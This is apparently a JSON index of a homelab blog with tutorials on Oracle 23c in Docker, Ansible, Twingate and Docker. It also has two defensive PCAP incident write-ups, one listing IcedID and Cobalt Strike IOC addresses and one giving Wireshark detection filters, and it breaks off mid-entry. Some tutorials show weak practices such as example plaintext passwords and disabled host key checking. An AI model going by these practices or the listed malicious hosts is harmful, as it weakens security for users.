[ { "title": "Checking out Oracle Database 23c", "url": "/posts/oracle/", "categories": "homelab, info, software", "tags": "docker, hosting", "date": "2023-12-10 11:00:00 -0800", "snippet": "What We Are DoingToday, I will be guiding you through the process of setting up a dockerized instance of an Oracle Database 23c for free, as well as delving into the general overall structure of how the database functions.What It IsIt’s exactly what you expect—a database designed for storing data, much like any other SQL-based database. Imagine it as a large Excel document.What I really want to explore are the exciting capabilities that Oracle Database 23c offers. By examining the diagram below, you can visualize the logical map of how it would appear.(go here if you want to interact with the diagram)The thing I find most interesting is that you can have separate plugable databases within the root database that can share data across each other and easily migrate from one database to another. I can’t wait to start experimenting with this! Just need to come up with a reason for implementing it in the homelab XD.How I Will Be Setting It UpI will be setting this up in Docker, as I find it to be the easiest deployment method to follow along with, and I simply like Docker. So, without further ado, let’s get to it!Docker SetupFirst things first, we need to get Docker installed. I will be using Ubuntu 22.04 LTS as my base system; however, you can use whatever distro you like, provided you know how to set up Docker.The easy way to get this done on Ubuntu is by following these steps:sudo apt update sudo apt install docker.ioOnce this is complete, we can pull down our container from DockerHub.To pull down the container and run it, I will be using the following command:sudo docker run -itd --name oracledb -e ORACLE_PWD='oracledb' -p 1521:1521 container-registry.oracle.com/database/free:latestLet’s break it down.We start with a normal docker run command and give it the flags -itd. i - Keep STDIN open even if not attached t - Allocate a pseudo-tty d - Detached mode: Run container in the backgroundWe want to keep the standard input open for our container while running it in detached mode. We also want to have an available tty for interactions.I am naming the container oracledb and need to set a password for the root user. For testing purposes, I will be setting this to the container’s name.After this, we need to map the internal port 1521 to the external port 1521, which is the default port used by OracleDB TNS listener, so that the database is accessible outside the container.After this setup, we pull it down from the hub.Once it is installed, check and see if it is up with a docker ps. If it is up, you’re good to go! You’re all done!Just kidding. We want to play around and learn a few things, right? Well, let’s get a shell on the container.Accessing the Databasesudo docker exec -it oracledb bashThis command will provide us with a bash shell on the tty we had specified earlier within our oracledb.To access the database, we can plug in using the sqlplus command. This is what we will be using to interact with the database via the CLI.To log in as the root or system user, we will do the following:sqlplus sys/oracledb@localhost:1521 as sysdbaLet’s break this down as well.We first call our command sqlplus. As stated, this command lets us interact with the database.Next, we do something similar to how we would SSH into a system but with a few twists.We will log in as the user sys or system and specify the password we had set when we ran the container, which is oracledb.Next, we point it at localhost since the database is on our current container, and then give it the default port for the TNS Listener service (1521) that we specified earlier and mapped to our host port.Now you should be presented with a new prompt, and you are in the database!SyntaxNow, since Oracle likes to be different, they have a slightly different syntax for interacting with the database.If you want to know the full syntax, here are the docs.Here, you will find flow charts for just about all the commands you can think of to interact with and create databases.Cool Useful ThingsThe coolest thing, in my opinion, is the JSON Relational Duality feature. Coming from a Python dev background, being able to simply provide the database with JSON and having it convert to a SQL database with all the search and filter features is pretty cool! For instance, if you have large datasets or outputs from an API or output from some AI/ML program, it is incredibly useful for filtering and editing these outputs.ConclusionThere you have it—the bare basics of setting up and interacting with an Oracle database. If you want to learn more, I highly recommend checking out the docs here. For additional insights on Docker, feel free to explore my Docker post, along with some of my Ansible playbooks post or visit my GitHub." }, { "title": "Getting Started with Ansible", "url": "/posts/ansible/", "categories": "homelab, software", "tags": "network, linux, hosting, servers, automation", "date": "2023-10-13 12:00:00 -0700", "snippet": "IntroAlright folks this is gonna be a long one so grab some tea. This wont be a walk through really of how to do this on your system tho there will be some simple examples to follow if you are so inclined, and to help with navigating it here’s a table of contents to keep track.What is AnsibleAnsible is an IT automation tool. Simply put, you can automate the maintenance and creation of your infrastructure saving you time on deployments. Wether you are administering a simple homelab or orchestrating an entire datacenter it can help simplify your workload making most if not all your tasks manageable within a simple file.How to InstallTo ensure you always have the most up-to-date versions of Ansible and Ansible Navigator, it’s recommended to use pipx, a tool that avoids dependency issues and system conflicts. Here are the steps to install them:pipx install --include-deps ansible ansible-navigator argscompleteIf you want shell completion for the commands, you can add the following:pipx inject --include-apps ansible argscompleteTo configure argscomplete, follow these steps (please note that this method requires Bash 4.2 or later):activate-global-python-argcomplete --userCongratulations! You now have Ansible installed with tab completion.Basic CommandsI won’t be going into detail on all the commands; that’s what manpages are for. However, I can provide a few examples of the commands you will be running and where some of the default files will be located.FIles located in /etc/ansibleansible.cfg This file is the default configuration file for Ansible, allowing you to specify or customize its behavior. It includes settings such as SSH configurations, default inventory files, remote users, roles paths, module paths, logging, and plugin configurations.hosts Often referred to as the inventory file, this document defines the hosts and groups within your environment, along with some variables you can specify for the hosts.roles This directory allows you to store specific roles that you can call and reuse in your playbooks. The common file structure for the directory is as follows:$/etc/ansible&gt; roles/- tasks/ #contains the main playbook tasks for the role- handlers/ # contains handler tasks that can be notified by other tasks- templates/ # holds jinja2 templates that can be used in tasks.- files/ # contains files that can me copied to remote hosts- vars/ # stores variables specific to the role- defaults/ #stores default values for role variables - meta/ # contains metadata about the role- readme.md # documentation about the role When you include a role in your playbook, Ansible will execute the tasks defined in the role’s tasks/main.yml file.Host and Inventory file configurationThis file is written in the .ini format and contains host information for devices you want to automate. You can define specific groups for your devices or assign variables to them, such as login credentials.Here is an example structure:[web_servers]wb1.example.com 192.168.0.254 [db_servers]db1.example.comdb2.example.com[dev_env:children]web_serversdb_serversAs you can see, you can specify a machine either with a domain name or an IP address and group them together in a group by using a semicolon :.How I will be using itIn my homelab, I host multiple systems, primarily Linux-based, on my network, including Docker containers. There are three primary tasks I want to be able to accomplish: Update all systems: Ensure all systems are up to date. Initialize and set up systems and containers: Configure new systems and containers as needed. Automate Docker updates, installations, and configurations: Automatically manage Docker updates, installations, and configurations across the network.Updating SystemsSince I am constantly changing my homelab, I won’t be providing any specifics about what I am currently using. If you would like updated playbooks for what I am currently running, stop by my GitHub and take a look.Here is an example of how to update an Ubuntu system and a Windows system:---- name: Update Ubuntu and Windows 10 machines hosts: all become: yes tasks: - name: Update Ubuntu packages apt: upgrade: yes update_cache: yes when: \"'ubuntu' in inventory_hostname\" - name: Update Windows 10 using win_updates win_updates: category_names: SecurityUpdates,UpdateRollups state: installed when: \"'windows' in inventory_hostname\"System InitializationBecause I’m constantly changing things, having the ability to hit a delete button and run a script to rebuild everything is incredibly valuable. It’s a liberating feeling, knowing that if something goes down or gets corrupted, I can bring it back with just one command. As I mentioned before, if you want to stay updated on the playbooks I currently have in place, stop by my GitHub. If you’re looking for an example of how to build a system, here’s one on setting up a web server on Ubuntu (keep in mind this doesn’t follow best practices):---- name: Setup Web Server hosts: webserver # Host group containing your target Linux system(s) become: yes # Run tasks as sudo tasks: - name: Update apt package cache apt: update_cache: yes - name: Install Apache web server apt: name: apache2 state: present # Ensure Apache is installed - name: Start Apache service and enable it on boot service: name: apache2 state: started enabled: yes - name: Ensure Apache service is running wait_for: port: 80 timeout: 300 # Wait for 5 minutes for Apache to startDocker Automation and DeploymentNow, for the main bread and butter! Docker deployments via Ansible. This has got to be my favorite thing to do so far, and it makes my homelab deployment super quick. Because I am still writing more playbooks, please visit my GitHub for my updated scripts. Just as an example, here is how I am currently deploying Portainer in my homelab.---- name: Portainer Deployment hosts: docker-hosts tasks: - name: Deploy Portainer community.docker.docker_container: name: portainer image: portainer/portainer-ce ports: - \"9443:9443\" - \"8000:8000\" volumes: - /var/run/docker.sock:/var/run/docker.sock - portainer_data:data restart_policy: alwaysNetwork and System AutomationHow to control network devicesYour scripts can vary widely depending on your network’s complexity and specific use cases. A good starting point is ansible-galaxy. By checking online here, you can search for extra plugins to assist in automating various systems. For example, there are plugins available for Cisco, Juniper, and UniFi products. In my case, I need to manage a PFSense box, so I will be using the pfsensible.core plugin, which can be installed using the following command:ansible-galaxy collection install pfsensible.coreThis module enables me to manage my firewall settings via Ansible. If you’d like to see example playbooks, you can check them out on my GitHub!If you are not using PFSense and just want to try configuring something simple like ufw on the host then you can do so like this:---- name: Configure ufw hosts: host become: yes tasks: # FIREWALL SETUP - name: Open SSH port ufw: state: enabled rule: allow port: \"22\" proto: tcpHow to control systemsYou can control other systems similarly; however, most tasks can be completed with the built-in modules.For Linux machines, you can call the module for the various package managers and execute commands just as you would in a terminal within the playbook.Similarly, for Windows, it works the same way. Their built-in modules can assist in controlling their systems and servers as well.Playbook CreationCondensing jobs into PlaybooksPlaybooksA playbook is a set of tasks that you want to run in a specific order or by a specific condition, all under one YAML file.For example, if you want to update your repositories and packages on a Debian-based system, you can do the following:---- name: Update debian servers hosts: your_server_group # Replace this with the group of servers you want to update become: true # Enable privilege escalation (sudo) tasks: - name: Update apt cache apt: update_cache: yes become: true - name: Upgrade all packages apt: upgrade: dist autoremove: yes autoclean: yes become: trueNow, let’s understand what is going on in the playbook: We defined the name of our playbook as update debian servers. We specified the hosts we want the playbook to execute on (these are specified in our inventory.ini file). For this task, we chose to execute it with elevated privileges via sudo, using the become: true directive. Once that has been set, we can define the tasks we want to run. Refer to [[#Tasks]] for more information. Under this section, we specify the name of the task we are performing and then execute our commands. Tasks Tasks are simply actions that you want to perform on the specified systems. The variables you use will vary based on your specific use case, so you will need to refer to the base documentation or the documentation for the module from ansible-galaxy for guidance. Roles Roles enable you to organize and structure your automation tasks, playbooks, and associated files in a reusable and modular manner. They promote code reusability, maintainability, and organization, making it easier to manage complex automation projects. This concept is described further under [[#Files located in /etc/ansible]]. Handlers Handlers are a specific type of task used to manage service states on remote hosts, usually in response to changes made by other tasks in a playbook. They are commonly employed to ensure that specific actions, such as restarting a service or reloading a configuration, are only triggered when necessary. This reduces unnecessary service interruptions and improves playbook efficiency. Here is an example: ---- name: Install and configure Apache hosts: your_servers tasks: - name: Update apt package cache apt: update_cache: yes - name: Install Apache web server apt: name: apache2 state: present notify: - Restart Apache handlers: - name: Restart Apache service: name: apache2 state: restartedIn this playbook: The first task updates the apt package cache on the target servers. The second task installs the Apache web server (apache2 package) using the apt module. If the package is installed or updated, it triggers the handler named Restart Apache. The handler Restart Apache is defined under the handlers section. When notified, it restarts the Apache service using the service module.In this example, the handler will only be triggered if the Apache package is installed or updated, ensuring that the service is restarted specifically when the installation state changes.Running a PlaybookUsing the “ansible-playbook” commandansible-playbook -i inventory_file playbook.ymlHere’s what each part of the command does: ansible-playbook: This is the command used to run Ansible playbooks. -i inventory_file: Specifies the path to the inventory file, which contains information about the hosts you want to manage with Ansible. Replace inventory_file with the actual path to your inventory file. playbook.yml: Specifies the path to the playbook file that you want to execute. Replace playbook.yml with the actual path to your playbook file. Using the “ansible-navigator” command ansible-navigator run playbook.yml In this command: ansible-navigator run: This part of the command indicates that you want to run an Ansible playbook using ansible-navigator. playbook.yml: Specifies the path to your playbook file. Replace playbook.yml with the actual path to your playbook file. Authentication methods Now, for user credentials, you have two options: you can either store them in plain text, which is not recommended for security reasons, or you can use Ansible Vault to securely encrypt sensitive data with a password. This password should be managed in a secure manner, either in a physically secure location or by using a trusted password manager. Password AuthenticationJust as an example, here is how you would set it up in plain text:Add the following to your playbook.ansible_user=&lt;remote-user&gt;ansible_password=&lt;remote-password&gt; This is only for password authentication. If you are using passwords, you need to disable host key checking. Go to the ansible.cfg file. Find host_key_checking and ensure it is set to false.Now, let’s get to the proper way to do this. Here is an example of using ansible-vault:ansible-vault encrypt_string 'my-password' --name 'db-password'Here, we are instructing ansible-vault to encrypt the password “my-password” and tag it with the name “db-password”. Once executed, it will prompt for a password and generate the encrypted password.Here is an example output:!vault |\t$ANSBLE_VAULT;1.1;AES256\t658975795687065786089598769a75965085665085975746760945694669659564975965085497675087597650864767657660795479856976a546087659786596508497a60959568567956807547680795684356789059486367606464395395407498769647a59650835542412145907579653423412143754a597659674354234312549460707454243612aWith this, you can copy it and use it either in your playbook or add it to the device in your inventory file. You can also reference it within your playbook as a variable, where in this case it is named “db-password”.SSH AuthenticationYou can also enable SSH login for the servers by first generating an SSH key pair.Here are some examples:This first example follows a centralized control model where your Ansible controller has control over the key pair. This can be both good and bad:Good: Simple to deploy and manage. Centralized control.Bad: Single point of failure: If the private key is compromised, the attacker can take over everything. Lack of granular control: Limited access control for individual machines if you want to restrict access.Now, here are your steps: On your Ansible control machine, generate the key pair:ssh-keygen -t rsa -b 4096 Next, copy the public key to the remote hosts. Make sure to change the remote-user to the user you want to use on the remote machine, and the remote-host to the domain name or IPv4 address of the remote machine:ssh-copy-id &lt;remote-user&gt;@&lt;remote-host&gt; You can test the SSH connection by making a connection with the following command:ssh &lt;remote-user&gt;@&lt;remote-host&gt; Now, update your Ansible inventory file with the user and host information.[web-servers]wb1.example.com ansible_ssh_user=&lt;remote-user&gt; ansible_ssh_host=&lt;remote-host&gt;Now, for the second method, it’s a bit more complex but adds better security. You will be making an SSH key for each machine and pushing it to the remote host like before, but this time naming the SSH key file and specifying it in the inventory.ini file. On your Ansible control machine, generate the key pair and name it:ssh-keygen -t rsa -b 4096 -f /path/to/keyfile Next, copy the public key to the remote hosts. Ensure you change the remote-user to the user you want to use on the remote machine, and the remote-host to the domain name or IPv4 address of the remote machine. Make sure you specify the public key file with the -i option and the path to the file.ssh-copy-id -i /path/to/keyfile.pub &lt;remote-user&gt;@&lt;remote-host&gt; You can test the SSH connection by making a connection with the following command:ssh -i /path/to/keyfile &lt;remote-user&gt;@&lt;remote-host&gt; Now, update your Ansible inventory file with the user and file location information.[web-servers]wb1.example.com ansible_ssh_user=&lt;remote-user&gt; ansible_ssh_private_key_file=/path/to/keyfile.pemSecrets managementSecuring passwords, API keys, and other sensitive credentials is crucial in ensuring the safety of your deployments. With Ansible-Vault, you are able to encrypt and secure this sensitive information. Here’s how you can impliment it in your docker deployments.Installing Ansible-Galaxy Collectionansible-galaxy collection install community.docker`Before proceeding, ensure Docker and Docker Compose are installed, along with the necessary SDK for the community.docker extension (Docker Python package).Creating a Docker ContainerTo start off, here is a basic example of how a container can be made with the community.docker extension.---- name: Portainer Deployment hosts: docker-hosts tasks: - name: Deploy Portainer community.docker.docker_container: name: portainer image: portainer/portainer-ce ports: - \"9443:9443\" - \"8000:8000\" volumes: - /var/run/docker.sock:/var/run/docker.sock - portainer_data:data restart_policy: alwaysIn this example we are using the docker_container command to create the container. from here it is esentialy the same as creating a docker compose file. however here we do not have any secrets to protect.In scenarios where sensitive information like API keys needs to be added to a configuration file within the container, Ansible can handle this securely using Ansible-Vault.Securely Adding API Key to Configuration- hosts: host vars_prompt: - name: api_key prompt: Enter the API key tasks: - name: Update API Key ansible.builtin.lineinfile: path: /path/to/config/file line: \"API_KEY=\"In this example we are prompting the user of this playbook to enter in the API Key before continuing on. While this can work for small or homelab deployments. For large enterprise use this can be cumbersome, and remembering lengthy, complex strings can be challenging. Ansible-Vault simplifies this process by allowing you to secure and automate sensitive data.Encrypting Sensitive Data with Ansible-VaultTo encrypt the API key using Ansible-Vault we will need to create a file that will store all our sensitive information. To do so we can run the following command:vim password_file.encNow this can be anywhere but preferable within the folder structure where your playbooks are kept. We can add in our password and label it in the file in the following formatapi_key: my_password123now you can use ansible-vault to encrypt the file.ansible-vault encrypt password_file.encwhen executed it will ask for a vault password to encrypt the file.once complete, you can verify that it is encrypted. you should see something like this in the file$ANSIBLE_VAULT;1.1;AES25643891207412936486234871230682346802349897231047123648732487324896213084603286408123640871326487123847132876408132640812370461230874610236408123640871236408732434876923741234021649123046032784238794927384692130423046021386498132640123640123747812340812360471236471236940234072364012374613294012360413264087132054601328740213412369460324012374601234612836402647326673263073860407820784590320410365365486235759624929now you can remove the unnessesary vars in the playbook we just made so that it is cleaner and more efficient.-hosts: host gather_facts: flase- tasks: - name ansible.builtin.lineinfile: path: /path/to/config/file line: \"API_KEY= \"now when you go to run the playbook you will need to specify the password file. ansible will decrypt the file and use the variables that are defined just like if you defined it within the playbook.ansible-playbook -i inventory.ini -e @password_file.enc --ask-vault-pass playbook.yamlthis will ask for your vault password to decrypt the file and then execute the playbook.Automate Furtherif you would like to automate this even more so that you do not have to enter in a password. you can use a password file that contains the vault password.(make sure to set proper permissions on this file so that only the ansible user can access this as to not leak the master password. this method while being more convinent, if not properly done can be worse than just having credentials in your playbooks)for this method you just need to create a file that contains your vault password:vim vault-passnow just add your password by itselfcat vault-passmaster-pass123now simply add this to your playbook command and your good.ansible-playbook -i inventory.ini -e @password_file.enc --ask-vault-pass vault-pass playbook.yamlnote that you will need to be executing this playbook as the owner of the vault-pass file otherwise it will not work.Managing Credentialsnow to edit the passwords in the vault you can either decrypt &gt; edit &gt; reencrypt, or you can use the edit command with ansible-vault. here are examples of both. ansible-vault editansible-vault edit password_file.encnow you can just edit it within the terminal decrypt &gt; edit &gt; encrypt wayansible-vault decrypt password_file.encvim password_file.encansible-vault encrypt password_file.encthere you have it! now you know how to manage secrets within your playbooks. now their are ways to integrate a password manager to manage the secrets tho i will not be going over that method here as it is a bit out of scope.ConclusionWhewww… Thank you all for reading! I hope this was a good starting place for you to get into Ansible within your homelab. trying to find a guide that would fit my needs had me going from article to article and video to video ultimately ending in me just reading the docs and playing around. if you know any ways i can make improvements to either the projects in my git repos or information in general feel free to reach out!" }, { "title": "Implementing Zero-Trust in my Homelab", "url": "/posts/zero-trust/", "categories": "homelab", "tags": "network, hosting, servers, docker", "date": "2023-09-19 12:00:00 -0700", "snippet": "How’s it going everyone! Once again I’ve decided to give my homelab another makeover, as I often do, and to start I want to ensure that I can access my services from outside my network. The plan is to have a setup that will allow me to study and practice on my homelab in my home network during my downtime at work or when I’m deployed. Initially, I was considering using OpenVPN, which I’ve used before. However, I’ve been hearing a lot about “Zero-Trust” security and how it’s more robust than a traditional VPN, offering better control over user access, and security when connected.That’s when I came across a company called Twingate. Their free tier, which supports up to 5 clients, seemed perfect for my needs. Before I delve into how I implemented Twingate into my homelab, let’s take a closer look at how this technology works.There are four main components: Client: This is the device that wants to remotely connect to a network using Twingate. Connector: The Connector is the service running on my home network, allowing clients to access resources within it. Controller: Twingate provides the Controller, which is used for User Access Control (UAC) towards the added resources via their web client. Relay: Now, here’s the fascinating part for you network enthusiasts. The Relay’s role is to bridge the connection between the client and the connector, establishing an encrypted TLS tunnel for secure communication, all while managing NAT traversal. For you visual learners out there here is a simple diagram of how it works:In your network setup, you’ll be hosting the Twingate connector. When a client seeks to connect to the network, it must first satisfy the security and authentication requirements specified in the Twingate controller. Once these prerequisites are met, the client shares its authentication token with the relay. The relay then matches the incoming NAT connection with the authenticated connector’s NAT connection, effectively establishing a secure TLS tunnel between them. This secure tunnel allows the user to access designated resources, as granted by the controller’s administrator.After the connection is established, your network configuration will appear as follows:No need for port forwarding, firewall configurations, or intricate IPTable adjustments to make it function. It simply works.This is precisely why I opted for this as my Zero-Trust solution.Now lets get into how to install it.The instalationI primarily run Linux-based servers and clients on my network, so my focus will be on the penguin side of things. However, it’s worth noting that the setup remains consistent because we’ll be utilizing Docker to deploy our connector. The only divergence comes with the client software, which I’ll discuss later on.To kick things off, let’s head over to Twingate’s website at https://www.twingate.com/ and give it a try for free.Step 1: Sign UpBegin by visiting the Twingate website at https://www.twingate.com/ and sign up for an account.Step 2: Account DetailsUpon entering the Twingate platform, you’ll be prompted to provide your information. Don’t worry if you’re not representing a business; you can simply enter the desired name and select “Less than 100 employees.” Step 3: Twingate DashboardNow that you’re inside your Twingate dashboard, as an admin, you have full control to create, modify, and manage everything you need. To start, let’s create a new network by clicking the “Add” button. Step 4: Network TypeSpecify the type of network you want to create, whether it’s on-premises or in the cloud.Step 5: Deploying ConnectorsOnce your network is created, click on any of the connectors to deploy. It doesn’t matter which one; deploying both provides redundancy in case one container goes down.Step 6: Docker DeploymentFor this installation, we’ll be using Docker. While other methods are available, Docker is often the most straightforward and efficient choice. ![[/assets/images/twingate/twingate7.png]]After selecting Docker, generate the required tokens. These tokens are essential for connecting your connector and client through the relay, ensuring secure access to trusted users. You can skip the DNS configuration unless you have specific requirements. For this tutorial, we’ll skip it. In Step 4, you’ll copy and paste the provided command into your Docker host. If you need help setting up a Docker host, you can refer to this tutorialfor guidance on Proxmox or any other Linux-based server. Step 7: ConfirmationAfter executing the command on your Docker host, your dashboard should display a confirmation message after a short wait. This indicates that your Twingate setup is ready to use. However, at this point, you have an empty connection. This is where the concept of Zero Trust comes into play; nothing is allowed unless explicitly permitted. Let’s add some resources and set permissions.![[/assets/images/twingate/twingate10.png]]Step 8: Adding ResourcesClick “Create Resource” to begin. ![[/assets/images/twingate/twingate11.png]]Step 9: Resource DetailsHere, you’ll see a prompt to add the local IPv4 address or domain name of the machine you want to access. Step 10: Setting RulesYou can define rules for the resource via the “Ports” button or create an alias to the site using the “Alias” button. These rules can specify accessible ports, whether to block all TCP or UDP packets, or even allow users to ping the server. Once you’re satisfied, click “Create Resource.” Step 11: Access ControlThis is where you determine who can access the resource. By default, you’ll have the “Everyone” group, but you can set up additional groups or specify services with access to the new resource. Step 12: CongratulationsCongratulations! You’ve successfully added your first resource. If you ever need to review the details of the resource, simply click on it to view the associated information. Connecting to TwingateNow that Twingate is all set up, the next step is connecting to it. How do you do that? Well, with the client software, of course!Depending on your system, whether it’s Android, iOS, Windows, macOS, or the Linux penguin itself, you have client-side software to get you up and running.For most systems, you’ll have a user-friendly GUI to guide you through the process. If you’ve ever installed software on your device, you can likely handle it from there. However, us Linux enthusiasts have a bit more of a manual process.Linux Installation:If you’re on Linux, head to the following site: https://www.twingate.com/docs/linux.Here, you’ll find a bash script that can automatically install the Twingate client, or you can choose to manually use your package manager. Regardless of your choice, once you’ve installed the Twingate client, enter the following command:sudo twingate setupThis command will give you a CLI prompt to go through the setup process.Once you’ve completed the setup, you’ll have remote access to your resources!There are numerous other aspects to fine-tune in order to achieve a higher level of control over a user’s connection, as well as to implement more secure methods for configuring your services and servers. Feel free to dive into the rabbit hole and play around customizing your security!Thank you for reading, and I hope you found this guide helpful. Feel free to stop by for more useful information!" }, { "title": "Setting up a Docker Host", "url": "/posts/docker-setup/", "categories": "homelab", "tags": "docker, servers", "date": "2023-09-17 12:00:00 -0700", "snippet": "first make sure you have your linux distro of choice setup either as a VM or Bare Metal. For this tutorial i will be using ubuntu 22.04 LTS now lets get startedInstalling Docker and Docker-ComposeDocker is a tool for containerization that simplifies the packaging and distribution of applications eliminating the old meme “It works on my machine.”. In this guide, we’ll explain how to install Docker and Docker-Compose on Ubuntu 22.04 using the package manager. Additionally, we’ll provide examples of starting a Docker container using both the docker and docker-compose commands.Step 1: Update APT Repository Before installing Docker, it’s a good practice to ensure that your APT package repository is up to date. Open a terminal and run the following commands:sudo apt updateStep 2: Install Docker.io and Docker-Compose To install Docker, you can use the APT package manager. Run the following command to install Docker.io and Docker-compose:sudo apt install docker.io docker-composeStep 3: Verify Docker Installation To confirm that Docker is installed correctly, run the following command:docker --versionYou should see the version of Docker displayed on your terminal.Step 4: Create a Docker Container Using docker Command Now that Docker is installed, let’s create a simple Docker container using the docker command. In this example, we will run a basic Nginx web server container:docker run -d -p 80:80 --name my-nginx nginx -d stands for “detached” mode, which runs the container in the background. -p 80:80 maps port 80 of your host to port 80 of the container. --name my-nginx assigns the name “my-nginx” to the container. nginx specifies the Docker image to use.You can access the Nginx web server by opening a web browser and navigating to your server’s IP address.Step 5: Create a Docker Container Using docker-compose Docker-Compose simplifies the management of multi-container applications. Here’s an example of a docker-compose.yml file that defines a simple Nginx and MySQL stack:version: '3'services: web: image: nginx ports: - \"80:80\" db: image: mysql environment: MYSQL_ROOT_PASSWORD: examplepasswordSave this file and then run the following command to start the defined services:docker-compose up -dThis will start both the Nginx and MySQL containers as specified in the docker-compose.yml file.Now you know how to install and run a container! We’ve covered the installation of Docker and Docker-Compose on Ubuntu 22.04 using APT. Additionally, we created Docker containers using both the docker and docker-compose commands. Go forth, create and deploy whatever comes to mind! Thank you for reading! Hope to see you again" }, { "title": "Burn in Candle - Traffic Analysis", "url": "/posts/burnincandle/", "categories": "traffic analysis", "tags": "blueteam, wireshark, pcap, networking", "date": "2023-08-21 12:00:00 -0700", "snippet": "Where have I been?Apologies for the long silence. Lots of personal life stuff hit and had to take a break from my posts (even tho their aren’t many). Any who I haven’t just stopped my learning! When I had some free time I started learning more on Ansible and docker, did the google cyber security cert, and have been teaching fellow DoD members some networking and stuff. Any who enough with the excuses lets get to it!TopicThe site I will be using to get PCAPs for the practice analysis is Malware Traffic Analysis . If you want to follow along with the specific PCAP I will be using you can find it here, and for my coloring rules you can either take them from my previous post here, or from my Github.Today I will be sharing another Threat Hunting/Traffic Analysis post and some of the methodology I have been building in helping me find IOCs.TASK Write an incident report based on traffic from the pcap.Steps TakenSo, here’s what I found: There was a strange GET request to 188.166.154.118 on port 80, heading to the domain oceriesfornot.top. What stood out was that it used the “.top” domain, and it only had a cookie with system info.I did some more digging and ran the domain and IP through VirusTotal. Turns out, both were marked as suspicious. Digging deeper, I found the downloaded file was Icedid malware, a sneaky remote access Trojan. I read up on it on this site, and it’s one of those second-stage threats. The search for the dropper isn’t over yet.Before jumping back in, I noted down details about the infected system for future reference:Host info IP: 10.0.19.14 MAC: 00:60:52:b7:33:0f Device Name: DESKTOP-5QS3D5D ?User: patrick.zimmermanGoing back to the PCAP, after the previous action, a new connection popped up via HTTPS to IP “157.245.142.66” linked to antnosience.com.Turns out, this IP didn’t pass VirusTotal’s test either. Plus, another domain, otectagain.top, was flagged.Skimming through more packets, I saw a connection to IP “160.153.32.99,” which is connected to the domain suncoastpinball.com.The next part gets messy: More action from the previous IP, along with a lot of messy stuff from suncoastpinball.com. Think duplicate acknowledgments, out-of-order stuff, and reset packets. What’s interesting is that the infected system asked the domain controller for an endpoint map and wanted to use LSARPC. Basically, it’s like asking for permission for remote actions. This hints at the potential for NTLM Relay Attacks on the Active Directory (AD) Certificate Services.At 13:59:40 PDT, something significant happened: The infected system successfully logged onto the SMB server hosted by our domain controller at 10.0.19.9.Then it started hunting for backup file versions on the server, probably to grab data. At the same time, it went on a domain expedition to figure out the network.As time went on, encrypted chats started between the infected system and the bad guys at 157.245.142.66 and 160.153.32.99 – they were up to some data sneaking.The story kept going, with more back-and-forths between the infected system and the domain controller, plus calls to those known bad IPs and ongoing SMB connections.At 16:55:55 PDT, the host started looking into the domain controller’s policies through SMB traffic.Hold on, there’s a new connection! This time, it’s targeting “seaskysafe.com” (IP: “91.193.16.181”). VirusTotal said it’s a no-go zone, tagged as spyware, malware, and part of a bot network.There’s more: The IP “157.245.142.66” changed domains to otectagain.top, and 91.193.16.181 switched to “dilimoretast.com.”With all these domain changes, I took a closer look at the DNS requests and responses. Three domains caught my attention: “filebin.net” (185.47.40.36) seems to be a source or storage for infections; “situla.bitbit.net” (87.238.33.8 and 87.238.33.7) might be a proxy; and “bupdater.com” (23.227.198.203) is a sign of Cobalt Strike mischief.Interestingly, “filebin.net” and “situla.bitbit.net” appeared during SMB chats, hinting at data leaving the scene.Finally, towards the end, the calls went to “bupdater.com” for some sneaky persistence.I kept digging through this PCAP a few more times just to figure out what tricks this malware has up its sleeve on the network side. I also did some extra research and went deeper into understanding how it could sneak past the AD Certificate Service and use SMB to grab config info and other credentials from the DC. It’s pretty cool stuff, and I’m definitely planning to give some of these AD attacks a shot in my lab!So, there you have it – Thanks for reading! See you in the next one!ReportExecutive SummaryAt approximately 13:58:11 PDT on Mar 21, 2022, a Windows host operated by the user Patrick Zimmerman showed signs of infection from IcedID malware with data being stolen via File sharing sites and persistence with Cobalt Strike.Details Host info IP: 10.0.19.14 MAC: 00:60:52:b7:33:0f Device Name: DESKTOP-5QS3D5D User: patrick.zimmerman Domain Controller: BURNINCANDLE DC.burnincandle.com DC IP: 10.0.19.9 IOCsAccording to VirusTotal and Talos Inteligenceicedid malware 188.166.154.118 - port 80 - oceriesforno t.top - GET / 157.245.142.66 - port 443 - antnosience.com / otectagain.top - HTTPS Traffic 160.153.32.99 - port 443 - suncoastpinball.com - HTTPS Traffic 91.193.16.181 - port 443 - seaskysafe.com / dilimoretast.com - HTTPS Trafficsuspicious file sharing sites 185.47.40.36 - filebin.net - infection source/data storage 87.238.33.8 - 87.238.33.7 - situla.bitbit.net - proxyC2 traffic 23.227.198.203 - bupdater.com - malicious site/IOC for Cobalt StrikeNotesIcedid malware infection.SMB logon and data gathering attemptsfile exfiltrationCobalt Strike connectionConclusionRecommendations: Quarantine infected machines: The infected machines should be removed from the network to prevent further spread of the malware. Conduct a forensic analysis: A forensic analysis should be conducted on the infected machines to determine the extent of the infection and identify any other potential security risks. Update antivirus software: Ensure that antivirus software is up-to-date and all machines on the network are scanned for malware. Update Firewall rules to blacklist traffic to C2 and malicious IPs Educate users: Educate users on how to identify and avoid potential malware infection vectors such as phishing emails, click jacking, and suspicious attachments.Conclusion:The presence of IcedID and Cobalt Strike on the network is a significant security threat. Immediate action should be taken to prevent further spread and mitigate any damage caused by the malware. By following the recommendations outlined in this report, the organization can effectively mitigate the risk of future malware infections and strengthen its overall security posture." }, { "title": "Asco Limited - Traffic Analysis", "url": "/posts/ascolimited/", "categories": "traffic analysis", "tags": "blueteam, wireshark, pcap, networking", "date": "2023-05-15 12:00:00 -0700", "snippet": "The site I will be using to get PCAPS for the practice analysis is Malware Traffic Analysis . If you want to follow along with the specific PCAP I will be using you can find it hereToday I will be sharing another Threat Hunting/Traffic Analysis post and some of the methodology I have been building in helping me find IOCs.TASK Write an incident report based on the pcap and alerts. The incident report should contain the following: Executive Summary Details (of the infected Windows host) Indicators of Compromise (IOCs) Steps TakenFor this capture, I started off how I normally would, trying to get a full overview of the capture in Wireshark.To help me with this, I created a few coloring rules to spot specific types of traffic that could be considered malicious or odd. TCP Handshake : tcp.flags.syn == 1 IP Lookup : dns.qry.name contains \"ip\" Client Hello : tls.handshake.type == 1 Filtered GET/POST Requests : (http.request.method == \"GET\" ) &amp;&amp; !(http.request.uri contains \"/msdownload/update/\") || (http.request.method == \"POST\" ) Host Discovery : (icmp.type == 3 &amp;&amp; icmp.code == 2) || (icmp.type == 8 || icmp.type == 0) || (tcp.dstport == 7) || (udp.dstport == 7) || arp.dst.hw_mac == 00:00:00:00:00:00 Nmap Scans : 